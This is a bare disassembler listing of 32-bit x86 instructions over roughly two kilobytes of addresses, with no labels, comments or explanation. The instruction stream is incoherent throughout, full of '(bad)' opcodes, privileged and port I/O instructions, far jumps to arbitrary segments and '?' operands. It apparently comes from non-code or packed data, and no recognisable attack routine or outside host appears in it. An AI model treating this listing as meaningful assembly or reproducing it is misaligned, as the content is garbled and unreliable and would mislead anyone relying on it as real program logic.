  41f2ab:	outs   dx,DWORD PTR ds:[esi]
  41f2ac:	cmp    DWORD PTR [ebx],eax
  41f2ae:	or     eax,ebx
  41f2b0:	(bad)  
  41f2b1:	test   BYTE PTR [eax],0xc0
  41f2b4:	adc    BYTE PTR [ecx],bl
  41f2b6:	cwde   
  41f2b7:	pop    esp
  41f2b8:	into   
  41f2b9:	lods   al,BYTE PTR ds:[esi]
  41f2ba:	mov    edi,0xadbae7fe
  41f2bf:	and    eax,0x53a7f4d6
  41f2c4:	mov    ds:0x45efc7ac,eax
  41f2c9:	sub    edx,DWORD PTR [edx]
  41f2cb:	out    0xc8,al
  41f2cd:	jmp    0x1c55:0xab94e460
  41f2d4:	sbb    ecx,esi
  41f2d6:	fcomp  QWORD PTR [eax]
  41f2d8:	xchg   DWORD PTR [edx+0x7cef7247],ebp
  41f2de:	jp     0x41f2e0
  41f2e0:	and    BYTE PTR [eax],ch
  41f2e2:	(bad)  
  41f2e3:	imul   BYTE PTR [edi+0x53c21446]
  41f2e9:	mov    esp,0x116c6200
  41f2ee:	dec    DWORD PTR [ebp-0x1f]
  41f2f1:	std    
  41f2f2:	inc    edi
  41f2f3:	jo     0x41f34e
  41f2f5:	retf   
  41f2f6:	or     edx,DWORD PTR [ebx]
  41f2f8:	ins    BYTE PTR es:[edi],dx
  41f2f9:	repnz int3 
  41f2fb:	inc    edx
  41f2fc:	in     eax,0x43
  41f2fe:	psubusw mm7,mm0
  41f301:	adc    eax,0x7c905993
  41f306:	pop    ebp
  41f307:	test   ebp,0xb5814212
  41f30d:	bound  eax,QWORD PTR [eax+0x2c5ea500]
  41f313:	and    DWORD PTR [esi+0x28],eax
  41f316:	leave  
  41f317:	pop    ebp
  41f318:	cmc    
  41f319:	int3   
  41f31a:	xor    eax,0x802d08cf
  41f31f:	sbb    bh,dl
  41f321:	ss push edi
  41f323:	pop    eax
  41f324:	mov    ds:0x3ae2b450,eax
  41f329:	mov    ?,edx
  41f32b:	jge    0x41f2ff
  41f32d:	jb     0x41f30c
  41f32f:	mov    DWORD PTR [ecx],ebx
  41f331:	adc    edi,DWORD PTR [esi-0x41cec342]
  41f337:	and    DWORD PTR [esi],esp
  41f339:	imul   ebp,DWORD PTR [ecx+0x7bde1554],0x78
  41f340:	sub    ebx,edx
  41f342:	ja     0x41f398
  41f344:	jmp    0x41f3b9
  41f346:	dec    ecx
  41f347:	and    ch,dh
  41f349:	push   ebx
  41f34a:	jg     0x41f3bb
  41f34c:	sub    eax,0xc7cb6e39
  41f351:	call   0x76d31814
  41f356:	pop    edx
  41f357:	daa    
  41f358:	aad    0x4c
  41f35a:	pop    esp
  41f35b:	pop    eax
  41f35c:	arpl   WORD PTR [edx-0x64d5b892],bp
  41f362:	and    DWORD PTR ds:0xd6a998a5,ebp
  41f368:	mov    al,ds:0x460ea892
  41f36d:	mov    dh,0xa6
  41f36f:	push   ds
  41f370:	sbb    BYTE PTR [ebx-0x3971dd0e],dl
  41f376:	push   esp
  41f377:	stos   DWORD PTR es:[edi],eax
  41f378:	jns    0x41f307
  41f37a:	sbb    DWORD PTR [esi],edx
  41f37c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f37d:	pop    ecx
  41f37e:	mov    esp,DWORD PTR [ebx]
  41f380:	jmp    0x41f325
  41f382:	fs pop esp
  41f384:	adc    eax,0x7548fe84
  41f389:	pop    ecx
  41f38a:	push   esi
  41f38b:	aad    0xe7
  41f38d:	xchg   ecx,eax
  41f38e:	push   ds
  41f38f:	pop    ds
  41f390:	mov    bh,0xd9
  41f392:	mov    ah,0xd3
  41f394:	aam    0x6b
  41f396:	mov    esp,0x47f5686b
  41f39b:	popf   
  41f39c:	jns    0x41f342
  41f39e:	retf   
  41f39f:	sub    eax,0xe851df5
  41f3a4:	arpl   WORD PTR [ebx-0x4836611],ax
  41f3aa:	add    al,0x4c
  41f3ac:	push   ecx
  41f3ad:	bound  ebp,QWORD PTR [edi]
  41f3af:	pop    esi
  41f3b0:	jae    0x41f427
  41f3b2:	neg    DWORD PTR [ebp-0xa4fbf11]
  41f3b8:	jno    0x41f357
  41f3ba:	test   DWORD PTR [edi-0x5e482b4c],edx
  41f3c0:	fwait
  41f3c1:	ins    BYTE PTR es:[edi],dx
  41f3c2:	push   ebx
  41f3c3:	nop
  41f3c4:	sbb    al,0x3b
  41f3c6:	jecxz  0x41f407
  41f3c8:	push   ebx
  41f3c9:	sub    ebx,ebx
  41f3cb:	in     al,dx
  41f3cc:	pop    edi
  41f3cd:	or     ch,BYTE PTR [ebp-0x34]
  41f3d0:	(bad)  
  41f3d1:	scas   eax,DWORD PTR es:[edi]
  41f3d2:	in     al,dx
  41f3d3:	clc    
  41f3d4:	cs and eax,0x570220e6
  41f3da:	lahf   
  41f3db:	loope  0x41f42b
  41f3dd:	stos   DWORD PTR es:[edi],eax
  41f3de:	mov    bh,0xfd
  41f3e0:	inc    edx
  41f3e1:	fs pop ebp
  41f3e3:	pop    esi
  41f3e4:	jl     0x41f384
  41f3e6:	aam    0x5a
  41f3e8:	mov    ch,0x80
  41f3ea:	inc    ebx
  41f3eb:	adc    esp,DWORD PTR [ecx+0x57]
  41f3ee:	sub    ch,al
  41f3f0:	bound  esp,QWORD PTR [eax-0x50]
  41f3f3:	inc    ebx
  41f3f4:	push   ss
  41f3f5:	inc    ebx
  41f3f6:	mul    dl
  41f3f8:	sbb    DWORD PTR [bx+si+0x79],edi
  41f3fc:	pop    edi
  41f3fd:	test   BYTE PTR [edx+0x39],dh
  41f400:	(bad)  
  41f401:	mov    dh,BYTE PTR [ecx+esi*1-0x2626a54f]
  41f408:	or     BYTE PTR [di+0x711a],dl
  41f40d:	push   ecx
  41f40e:	das    
  41f40f:	enter  0x66e1,0x6f
  41f413:	(bad)  
  41f415:	inc    edx
  41f416:	das    
  41f417:	pop    ds
  41f418:	add    al,0x30
  41f41a:	in     al,0xb2
  41f41c:	mov    ebp,0x18551de1
  41f421:	jne    0x41f442
  41f423:	aas    
  41f424:	mov    edi,0x46e07cd3
  41f429:	mov    bl,bl
  41f42b:	loopne 0x41f49e
  41f42d:	sti    
  41f42e:	push   ds
  41f42f:	popf   
  41f430:	inc    edi
  41f431:	ins    DWORD PTR es:[edi],dx
  41f432:	(bad)  
  41f433:	retf   0xb65b
  41f436:	cmp    DWORD PTR [esi+0x9],0x7e
  41f43a:	or     al,0x3c
  41f43c:	(bad)  
  41f43d:	aaa    
  41f43e:	icebp  
  41f43f:	les    edi,FWORD PTR [ebx-0x5]
  41f442:	fcom   st(6)
  41f444:	mov    al,ds:0xe6416f5a
  41f449:	sub    BYTE PTR [ebp+0x36],bl
  41f44c:	enter  0x7c91,0x27
  41f450:	repz pusha 
  41f452:	je     0x41f460
  41f454:	jle    0x41f44a
  41f456:	xor    eax,0x77454e9
  41f45b:	jb     0x41f423
  41f45d:	inc    eax
  41f45e:	mov    cl,0x86
  41f460:	xor    bl,BYTE PTR [esi-0x64]
  41f463:	pop    ecx
  41f464:	popa   
  41f465:	sbb    eax,0x61dcc8d7
  41f46a:	adc    al,0xeb
  41f46c:	sbb    ah,bh
  41f46e:	inc    esi
  41f46f:	cdq    
  41f470:	inc    ebp
  41f471:	sub    eax,0x3a02ab3c
  41f476:	dec    esi
  41f477:	lods   eax,DWORD PTR ds:[esi]
  41f478:	aad    0x64
  41f47a:	xchg   ebp,eax
  41f47b:	lock in al,dx
  41f47d:	push   ebp
  41f47e:	retf   0x130
  41f481:	out    dx,al
  41f482:	cld    
  41f483:	mov    edi,0xc9e43e38
  41f488:	sub    BYTE PTR [esi+ecx*8-0x51],al
  41f48c:	mov    al,0x4c
  41f48e:	js     0x41f4b1
  41f490:	fadd   QWORD PTR [ecx+0x62053f51]
  41f496:	xchg   ebx,eax
  41f497:	pop    edx
  41f498:	inc    ebx
  41f499:	mov    BYTE PTR [eax],al
	...
  41f513:	add    BYTE PTR [edx+0xc],ch
  41f516:	lea    ebx,[eax-0x1806611]
  41f51c:	into   
  41f51d:	out    dx,al
  41f51e:	popf   
  41f51f:	adc    esi,DWORD PTR [ecx+ebx*4]
  41f522:	mov    ecx,0x18f6567
  41f527:	add    BYTE PTR [esi+0x7],ch
  41f52a:	add    BYTE PTR [eax],al
  41f52c:	mov    bl,0x1b
  41f52e:	cwde   
  41f52f:	push   edi
  41f530:	jmp    0xa1537a19
  41f535:	pop    esp
  41f536:	jne    0x41f5b4
  41f538:	(bad)  
  41f539:	pop    edi
  41f53a:	mov    edx,0x2ae09c5c
  41f53f:	mov    eax,db2
  41f542:	pop    es
  41f543:	out    0x24,eax
  41f545:	popa   
  41f546:	xor    DWORD PTR [eax-0x537b085a],ebp
  41f54c:	les    esi,FWORD PTR [ebx+0x103d8a43]
  41f552:	pop    esi
  41f553:	dec    edx
  41f554:	xor    ch,dl
  41f556:	inc    edi
  41f557:	pop    es
  41f558:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f559:	fisubr WORD PTR [eax-0x4deadc57]
  41f55f:	(bad)  
  41f560:	ror    bh,1
  41f562:	sub    BYTE PTR [ebx],dl
  41f564:	retf   0xf051
  41f567:	mov    al,0x6d
  41f569:	pop    ecx
  41f56a:	pop    ebx
  41f56b:	dec    esp
  41f56c:	das    
  41f56d:	push   0x17
  41f56f:	stos   BYTE PTR es:[edi],al
  41f570:	mov    ebp,0xe89e685a
  41f575:	popf   
  41f576:	mov    al,ds:0xac9d26d9
  41f57b:	imul   edx,DWORD PTR [ebp+esi*2+0x52],0xa270a8f4
  41f583:	jg     0x41f583
  41f585:	lds    esp,FWORD PTR [edx-0x18]
  41f588:	fmul   DWORD PTR [eax+0x5f9d7e8d]
  41f58e:	lahf   
  41f58f:	dec    edx
  41f590:	(bad)  
  41f591:	xor    BYTE PTR [edx],al
  41f593:	push   ds
  41f594:	sbb    al,0x79
  41f596:	xchg   ecx,eax
  41f597:	jmp    0x41f584
  41f599:	outs   dx,BYTE PTR ds:[esi]
  41f59a:	jmp    0x2f27:0x69daa54e
  41f5a1:	nop
  41f5a2:	dec    ecx
  41f5a3:	sub    DWORD PTR [eax-0x49],ebx
  41f5a6:	ret    
  41f5a7:	cmp    BYTE PTR [ebp-0x7436b4a0],ch
  41f5ad:	dec    ebp
  41f5ae:	add    BYTE PTR [edi+0x5302129d],al
  41f5b4:	xrelease mov BYTE PTR [edi-0x24185d2e],bh
  41f5bb:	or     ebp,eax
  41f5bd:	push   ss
  41f5be:	mov    eax,DWORD PTR [edi]
  41f5c0:	pop    edx
  41f5c1:	or     bh,BYTE PTR [ebx-0x5a]
  41f5c4:	fxch   st(6)
  41f5c6:	sbb    ecx,DWORD PTR [esi]
  41f5c8:	sbb    BYTE PTR [eax],dl
  41f5ca:	jg     0x41f645
  41f5cc:	mov    esi,0xbcf6141a
  41f5d1:	add    al,ah
  41f5d3:	pushf  
  41f5d4:	jmp    0xc7e9550b
  41f5d9:	push   ecx
  41f5da:	(bad)  
  41f5db:	out    dx,eax
  41f5dc:	mov    eax,ds:0xf6fdd128
  41f5e1:	test   BYTE PTR [esp+eax*2+0x1ab82fbc],0x31
  41f5e9:	dec    ebp
  41f5ea:	mov    esi,0x1dbbff66
  41f5ef:	add    eax,0xcf6d5886
  41f5f4:	or     eax,0x30c23bc0
  41f5f9:	and    al,0x8d
  41f5fb:	rcr    dl,cl
  41f5fd:	push   esp
  41f5fe:	mov    BYTE PTR [ecx+0x73],ch
  41f601:	fnsave [eax+0x1d72a217]
  41f607:	xchg   edx,ebx
  41f609:	rcr    BYTE PTR [eax+0x64],cl
  41f60c:	mov    WORD PTR ds:0x41cb21a4,ds
  41f612:	out    dx,al
  41f613:	jno    0x41f59c
  41f615:	xor    BYTE PTR cs:[edx-0x4f],0x23
  41f61a:	mov    ss,ebp
  41f61c:	popa   
  41f61d:	inc    edx
  41f61e:	mov    ds:0x767d4838,al
  41f623:	push   cs
  41f624:	cli    
  41f625:	js     0x41f685
  41f627:	xor    eax,0xfe8ddead
  41f62c:	sub    eax,0xbca95ec4
  41f631:	sbb    esi,DWORD PTR [esi-0x449062f3]
  41f637:	dec    ecx
  41f638:	(bad)  
  41f639:	(bad)  
  41f63a:	xchg   esi,eax
  41f63b:	rol    BYTE PTR [edi+0x62],cl
  41f63e:	nop
  41f63f:	xchg   ecx,eax
  41f640:	inc    edx
  41f641:	xlat   BYTE PTR ds:[ebx]
  41f642:	ror    ch,0xcb
  41f645:	(bad)  
  41f646:	mov    esi,0xaca6af6d
  41f64b:	inc    eax
  41f64c:	push   ecx
  41f64d:	test   BYTE PTR [esi],bl
  41f64f:	mov    esp,0x468e1929
  41f654:	ret    0xba78
  41f657:	jl     0x41f65f
  41f659:	inc    edx
  41f65a:	or     bh,cl
  41f65c:	jo     0x41f677
  41f65e:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41f660:	inc    ecx
  41f661:	(bad)  
  41f662:	jb     0x41f5e6
  41f664:	push   es
  41f665:	pop    esp
  41f666:	je     0x41f649
  41f668:	fidivr DWORD PTR [eax]
  41f66a:	or     eax,DWORD PTR [ecx-0x52]
  41f66d:	and    esp,DWORD PTR [edi]
  41f66f:	sbb    BYTE PTR [eax-0x65211138],bh
  41f675:	sub    dl,BYTE PTR [edi]
  41f677:	scas   al,BYTE PTR es:[edi]
  41f678:	push   ecx
  41f679:	out    0x13,al
  41f67b:	dec    esp
  41f67c:	mov    esp,0x8166792f
  41f681:	mov    eax,ds:0xcb7547d9
  41f686:	mov    dh,0x3f
  41f688:	std    
  41f689:	xchg   esp,eax
  41f68a:	iret   
  41f68b:	leave  
  41f68c:	dec    ebx
  41f68d:	js     0x41f691
  41f68f:	add    eax,0xf98b28be
  41f694:	inc    esi
  41f695:	cmp    BYTE PTR [edx+0x3e],0x82
  41f699:	push   edx
  41f69a:	mov    al,0x94
  41f69c:	xor    ebp,edx
  41f69e:	mov    dh,0x7e
  41f6a0:	jmp    0x41f632
  41f6a2:	cmp    bl,BYTE PTR [edx+0x5d89b27d]
  41f6a8:	retf   
  41f6a9:	stos   BYTE PTR es:[edi],al
  41f6aa:	or     BYTE PTR [edx],0xd7
  41f6ad:	(bad)  
  41f6ae:	jp     0x41f647
  41f6b0:	or     eax,0xd952d17d
  41f6b5:	fld    TBYTE PTR [edx]
  41f6b7:	test   DWORD PTR [ebp-0x6cec8b89],esp
  41f6bd:	pop    ecx
  41f6be:	xchg   BYTE PTR [esi],dl
  41f6c0:	lods   eax,DWORD PTR ds:[esi]
  41f6c1:	stc    
  41f6c2:	xchg   ebp,eax
  41f6c3:	mov    bh,0x4b
  41f6c5:	mov    ebp,0xaeecb5c1
  41f6ca:	enter  0xba51,0xfe
  41f6ce:	mov    ch,0x4
  41f6d0:	in     al,0xeb
  41f6d2:	pop    edi
  41f6d3:	mov    dl,0xd7
  41f6d5:	dec    edi
  41f6d6:	hlt    
  41f6d7:	mov    edx,esp
  41f6d9:	or     BYTE PTR [esi-0x34],ch
  41f6dc:	add    ch,BYTE PTR [ebx-0x6c]
  41f6df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6e0:	ins    BYTE PTR es:[edi],dx
  41f6e1:	jecxz  0x41f6c1
  41f6e3:	fistp  DWORD PTR [ebp-0x55]
  41f6e6:	add    BYTE PTR [esi+0x39],ch
  41f6e9:	std    
  41f6ea:	out    dx,eax
  41f6eb:	dec    esp
  41f6ec:	scas   al,BYTE PTR es:[edi]
  41f6ed:	xchg   ebx,eax
  41f6ee:	inc    ebp
  41f6ef:	jns    0x41f6ab
  41f6f1:	mov    cl,0xe4
  41f6f3:	xchg   bh,bl
  41f6f5:	scas   al,BYTE PTR es:[edi]
  41f6f6:	push   ebx
  41f6f7:	enter  0xb15f,0x6b
  41f6fb:	and    eax,0x3392ec97
  41f700:	daa    
  41f701:	adc    BYTE PTR [ecx+0x3a84f96a],dh
  41f707:	dec    edx
  41f708:	in     eax,dx
  41f709:	js     0x41f783
  41f70b:	popa   
  41f70c:	push   edx
  41f70d:	xchg   DWORD PTR [edx-0x52f19f35],esp
  41f713:	xor    DWORD PTR [edx+0x357807f],ebp
  41f719:	ss mov DWORD PTR cs:[edx+0x15],eax
  41f71e:	mov    dh,0x92
  41f720:	call   0xe2ae:0x74e656da
  41f727:	lea    esi,[edx-0x9]
  41f72a:	clc    
  41f72b:	ds das 
  41f72d:	xchg   esi,eax
  41f72e:	xchg   ebx,eax
  41f72f:	rcl    BYTE PTR [ecx+edi*1-0x2fb5b37],1
  41f736:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f737:	or     ch,bh
  41f739:	jecxz  0x41f753
  41f73b:	loopne 0x41f785
  41f73d:	xchg   esi,eax
  41f73e:	adc    dh,BYTE PTR [eax+0x35]
  41f741:	xor    dh,ah
  41f743:	xchg   ebx,eax
  41f744:	(bad)  
  41f745:	out    dx,eax
  41f746:	stc    
  41f747:	icebp  
  41f748:	xchg   ecx,eax
  41f749:	inc    esp
  41f74a:	xor    bl,BYTE PTR [edx+0x6f]
  41f74d:	stos   BYTE PTR es:[edi],al
  41f74e:	add    edx,0x28a69b02
  41f754:	pop    ebp
  41f755:	ret    0xc74c
  41f758:	hlt    
  41f759:	scas   eax,DWORD PTR es:[edi]
  41f75a:	jl     0x41f713
  41f75c:	imul   edi,ebp,0xe20994c3
  41f762:	test   eax,0x72a47038
  41f767:	lea    esi,[ecx+edi*2-0x6661acb6]
  41f76e:	add    dh,al
  41f770:	cmp    ch,bh
  41f772:	add    edx,edx
  41f774:	add    bl,BYTE PTR [edx]
  41f776:	nop
  41f777:	cmp    eax,0x45e16152
  41f77c:	mov    ds:0x781bb5e2,eax
  41f781:	xchg   esp,eax
  41f782:	jecxz  0x41f790
  41f784:	daa    
  41f785:	out    dx,eax
  41f786:	(bad)  
  41f787:	mov    bh,0x14
  41f789:	cmp    cl,cl
  41f78b:	add    esi,ebx
  41f78d:	std    
  41f78e:	pop    ss
  41f78f:	mov    ch,0x6f
  41f791:	mov    WORD PTR [eax],?
  41f793:	sub    eax,0x5172df9f
  41f798:	and    dl,BYTE PTR [edi]
  41f79a:	retf   0xb612
  41f79d:	ss cmp al,0x21
  41f7a0:	(bad)  
  41f7a1:	(bad)
  41f7a5:	aad    0x32
  41f7a7:	aam    0xb0
  41f7a9:	aam    0x14
  41f7ab:	pusha  
  41f7ac:	ret    0xbb95
  41f7af:	into   
  41f7b0:	int    0xad
  41f7b2:	xchg   ebx,eax
  41f7b3:	jbe    0x41f78c
  41f7b5:	jns    0x41f7d0
  41f7b7:	ficom  DWORD PTR [esi-0x3bc092d0]
  41f7bd:	inc    edi
  41f7be:	jecxz  0x41f777
  41f7c0:	sbb    eax,0x86f9017f
  41f7c5:	mov    ebx,ss
  41f7c7:	add    eax,edx
  41f7c9:	mov    dl,0xc1
  41f7cb:	mov    dl,0x6e
  41f7cd:	mov    esi,0x110b665b
  41f7d2:	int    0xaa
  41f7d4:	aam    0xb0
  41f7d6:	or     ebx,DWORD PTR [eax+0xa3fc8e]
  41f7dc:	ins    DWORD PTR es:[edi],dx
  41f7dd:	out    dx,eax
  41f7de:	lahf   
  41f7df:	cld    
  41f7e0:	sub    esp,DWORD PTR [ecx-0x1d]
  41f7e3:	icebp  
  41f7e4:	xchg   edx,eax
  41f7e5:	outs   dx,DWORD PTR ds:[esi]
  41f7e6:	mov    ch,0x2c
  41f7e8:	outs   dx,BYTE PTR ds:[esi]
  41f7e9:	xchg   edi,eax
  41f7ea:	mov    bh,0xa0
  41f7ec:	lds    ebx,FWORD PTR fs:[esi]
  41f7ef:	xchg   BYTE PTR [eax],al
  41f7f1:	mov    WORD PTR [edi+0x7a967c0a],?
  41f7f7:	jbe    0x41f82c
  41f7f9:	inc    ecx
  41f7fa:	mov    cl,0xd3
  41f7fc:	inc    esp
  41f7fd:	adc    BYTE PTR [ebx-0x49],bh
  41f800:	push   edi
  41f801:	jge    0x41f7cf
  41f803:	adc    BYTE PTR [esi-0x2ae4c703],0xcc
  41f80a:	mov    al,0xb3
  41f80c:	mov    ds:0xd2761b2b,eax
  41f811:	jl     0x41f7f4
  41f813:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f814:	mov    cl,0x95
  41f816:	leave  
  41f817:	popa   
  41f818:	dec    esi
  41f819:	cdq    
  41f81a:	stc    
  41f81b:	cli    
  41f81c:	xadd   bl,dl
  41f81f:	scas   al,BYTE PTR es:[edi]
  41f820:	add    BYTE PTR [eax-0x6a],dh
  41f823:	lds    esp,FWORD PTR [esi]
  41f825:	aam    0x3c
  41f827:	icebp  
  41f828:	inc    ebx
  41f829:	sub    ch,bh
  41f82b:	iret   
  41f82c:	xchg   BYTE PTR [eax+0x7c],cl
  41f82f:	cmp    DWORD PTR [eax],edx
  41f831:	js     0x41f7c5
  41f833:	(bad)  
  41f834:	loope  0x41f838
  41f836:	xchg   edx,eax
  41f837:	(bad)
  41f83a:	mov    ah,0x1
  41f83c:	xlat   BYTE PTR ds:[ebx]
  41f83d:	mov    bh,0xa4
  41f83f:	or     eax,0xaf8e089e
  41f844:	xchg   edx,eax
  41f845:	enter  0x7f35,0x6a
  41f849:	push   si
  41f84b:	test   DWORD PTR [edx-0x3c],ebx
  41f84e:	push   es
  41f84f:	cmp    eax,ebp
  41f851:	xchg   edx,eax
  41f852:	jb     0x41f89a
  41f854:	(bad)  
  41f855:	push   0xd79fd26f
  41f85a:	xor    edx,DWORD PTR [ecx]
  41f85c:	inc    edi
  41f85d:	test   DWORD PTR ds:0xa3f4687f,ebp
  41f863:	punpckhwd mm3,QWORD PTR [esp+ecx*1]
  41f867:	dec    ebx
  41f868:	shl    DWORD PTR [ebp+0x3e592c65],1
  41f86e:	mov    al,ds:0x99215fa4
  41f873:	in     al,dx
  41f874:	jmp    0x41f8d8
  41f876:	xchg   edi,eax
  41f877:	jle    0x41f889
  41f879:	aas    
  41f87a:	jbe    0x41f811
  41f87c:	je     0x41f882
  41f87e:	lock pop ss
  41f880:	arpl   bp,dx
  41f882:	aad    0x27
  41f884:	mov    al,ds:0x1b872afb
  41f889:	inc    edx
  41f88a:	rcr    esi,0x24
  41f88d:	xchg   ebp,eax
  41f88e:	push   0xdc9b8138
  41f893:	push   ds
  41f894:	repz xchg edx,ebp
  41f897:	in     eax,0x68
  41f899:	add    edi,0x53b85bd7
  41f89f:	sub    ch,dl
  41f8a1:	fisub  WORD PTR ds:0x5655a99c
  41f8a7:	jns    0x41f8ab
  41f8a9:	dec    esp
  41f8aa:	jne    0x41f8a0
  41f8ac:	addr16 ja 0x41f86d
  41f8af:	lods   eax,DWORD PTR ds:[esi]
  41f8b0:	jge    0x41f8ed
  41f8b2:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8b4:	mov    BYTE PTR [edx+0x505d43cc],0x19
  41f8bb:	test   al,0xd9
  41f8bd:	ja     0x41f91e
  41f8bf:	mov    dh,0xa0
  41f8c1:	inc    edx
  41f8c2:	cmp    al,0xbf
  41f8c4:	out    dx,eax
  41f8c5:	xchg   DWORD PTR [edi+0x72],ebp
  41f8c8:	arpl   WORD PTR [esi-0x61f7b9f4],di
  41f8ce:	push   ecx
  41f8cf:	pusha  
  41f8d0:	and    BYTE PTR [ebx],bl
  41f8d2:	js     0x41f91b
  41f8d4:	push   es
  41f8d5:	pop    edx
  41f8d6:	stos   DWORD PTR es:[edi],eax
  41f8d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8d8:	mov    WORD PTR [esi+0x39eae133],fs
  41f8de:	lea    edx,[ecx+ecx*8-0x43a78fe]
  41f8e5:	pop    ecx
  41f8e6:	add    esp,DWORD PTR [edx+0x7b]
  41f8e9:	ds push esp
  41f8eb:	pop    edx
  41f8ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8ee:	add    al,0xd2
  41f8f0:	leave  
  41f8f1:	stc    
  41f8f2:	dec    ebx
  41f8f3:	mov    ch,0x81
  41f8f5:	mov    dl,0x45
  41f8f7:	xor    ch,BYTE PTR [esi]
  41f8f9:	lods   eax,DWORD PTR ds:[esi]
  41f8fa:	push   es
  41f8fb:	or     DWORD PTR [edx-0x72],eax
  41f8fe:	les    ebx,FWORD PTR [edx+0x5dcf3b95]
  41f904:	ins    DWORD PTR es:[edi],dx
  41f905:	mov    DWORD PTR [edx+eax*4-0x1f],edi
  41f909:	inc    eax
  41f90a:	or     al,0x27
  41f90c:	push   0x861ba019
  41f911:	lea    ecx,[eax+eiz*2]
  41f914:	jmp    0xa37dac12
  41f919:	pop    ebx
  41f91a:	lds    ecx,FWORD PTR [edx+0x4426aea4]
  41f920:	test   esp,esp
  41f922:	pop    ebx
  41f923:	mov    eax,ds:0xf49f9958
  41f928:	jg     0x41f965
  41f92a:	pop    edi
  41f92b:	dec    ebx
  41f92c:	inc    edi
  41f92d:	cmp    DWORD PTR [esi],edx
  41f92f:	inc    ch
  41f931:	popf   
  41f932:	pop    ebp
  41f933:	ins    DWORD PTR es:[edi],dx
  41f934:	jbe    0x41f8ee
  41f936:	sub    BYTE PTR [esi],cl
  41f938:	inc    si
  41f93a:	cli    
  41f93b:	ins    DWORD PTR es:[edi],dx
  41f93c:	jns    0x41f931
  41f93e:	mov    edi,DWORD PTR [eax]
  41f940:	int3   
  41f941:	inc    edi
  41f942:	cmp    eax,DWORD PTR ds:0x10cc42f3
  41f948:	or     cl,BYTE PTR [esi-0x15]
  41f94b:	call   esi
  41f94d:	xor    ah,cl
  41f94f:	scas   eax,DWORD PTR es:[edi]
  41f950:	mov    ch,0xde
  41f952:	mov    esi,0xac86f663
  41f957:	push   0x7cd2dce3
  41f95c:	jne    0x41f90c
  41f95e:	rcl    BYTE PTR [ebx-0x5e],0xd9
  41f962:	js     0x41f93f
  41f964:	cwde   
  41f965:	out    dx,eax
  41f966:	xchg   ecx,eax
  41f967:	adc    al,0xee
  41f969:	push   0x601da907
  41f96e:	jp     0x41f964
  41f970:	loop   0x41f925
  41f972:	fwait
  41f973:	push   esi
  41f974:	test   eax,0x9b403690
  41f979:	inc    edi
  41f97a:	in     eax,dx
  41f97b:	out    0x30,eax
  41f97d:	in     al,dx
  41f97e:	add    al,0x45
  41f980:	je     0x41f918
  41f982:	imul   esi,DWORD PTR [edx-0x4d1c754a],0xed04a9f8
  41f98c:	mov    ecx,0x6464bc0e
  41f991:	inc    ecx
  41f992:	retf   0xef26
  41f995:	imul   edi,DWORD PTR [esi],0xfd13425e
  41f99b:	mov    WORD PTR [ecx-0x2d],?
  41f99e:	(bad)  
  41f99f:	inc    esp
  41f9a0:	fisubr WORD PTR [esi-0x2f]
  41f9a3:	sbb    al,0xac
  41f9a5:	clc    
  41f9a6:	cmp    BYTE PTR [edi-0x7db7fa8f],cl
  41f9ac:	add    BYTE PTR [ecx],bl
  41f9ae:	mov    esp,0x9baba217
  41f9b3:	stos   BYTE PTR es:[edi],al
  41f9b4:	jnp    0x41f97e
  41f9b6:	dec    ecx
  41f9b7:	add    BYTE PTR [esi+ebp*4+0x5e],bl
  41f9bb:	jno    0x41fa1f
  41f9bd:	xor    bl,BYTE PTR [ebx]
  41f9bf:	xor    eax,0x9ac5e27c
  41f9c4:	mov    DWORD PTR [eax-0x20b884f6],ebx
  41f9ca:	arpl   sp,si
  41f9cc:	and    al,0xb8
  41f9ce:	sub    edi,DWORD PTR [edi+0x39]
  41f9d1:	sti    
  41f9d2:	xchg   edx,eax
  41f9d3:	or     DWORD PTR [esi],0xe7faa5db
  41f9d9:	in     eax,0x46
  41f9db:	sahf   
  41f9dc:	cmp    eax,0x4b83d5b1
  41f9e1:	and    BYTE PTR [ebp+0x73],bh
  41f9e4:	into   
  41f9e5:	hlt    
  41f9e6:	xchg   ebp,eax
  41f9e7:	(bad)  
  41f9e8:	addr16 retf 0xde6
  41f9ec:	mov    ecx,0x31e0313a
  41f9f1:	(bad)  [ebp+0x40]
  41f9f4:	sbb    DWORD PTR [esi+0x48],0x9629df62
  41f9fb:	xor    BYTE PTR [esi+ebx*1],ah
  41f9fe:	stc    
  41f9ff:	and    eax,0x480364e3
  41fa04:	js     0x41fa07
  41fa06:	pop    ebx
  41fa07:	inc    edi
  41fa08:	push   ebp
  41fa09:	int    0x80
  41fa0b:	dec    ebp
  41fa0c:	shl    BYTE PTR [ebx-0x680e0fb3],1
  41fa12:	sbb    DWORD PTR [ebx+0x1c2b7a22],esp
  41fa18:	jns    0x41fa8b
  41fa1a:	fiadd  WORD PTR [ecx-0x46ea7ad]
  41fa20:	push   ecx
  41fa21:	push   0xffffffd2
  41fa23:	ins    DWORD PTR es:[edi],dx
  41fa24:	jnp    0x41fa19
  41fa26:	sub    eax,0xa7b3b8aa
  41fa2b:	mov    cl,0x6a
  41fa2d:	mov    ah,0xa4
  41fa2f:	fwait
  41fa30:	adc    BYTE PTR [eax],0xb6
  41fa33:	lds    ecx,FWORD PTR [esi-0x5f]
  41fa36:	aad    0x26
  41fa38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa3a:	out    0x69,al
  41fa3c:	into   
  41fa3d:	sbb    al,0x9c
  41fa3f:	inc    ebp
  41fa40:	dec    eax
  41fa41:	lods   eax,DWORD PTR ds:[esi]
  41fa42:	int3   
  41fa43:	shl    bh,1
  41fa45:	xor    BYTE PTR [edx+eax*2+0x31],ah
  41fa49:	pop    ecx
  41fa4a:	out    dx,al
  41fa4b:	mov    dl,0x5e
  41fa4d:	and    al,0xfc
  41fa4f:	test   al,dl
  41fa51:	cmp    dh,0xac
  41fa54:	add    ebp,ecx
  41fa56:	or     eax,0x142c5d93
  41fa5b:	call   0xf9a0a193
  41fa60:	mov    al,0xbf
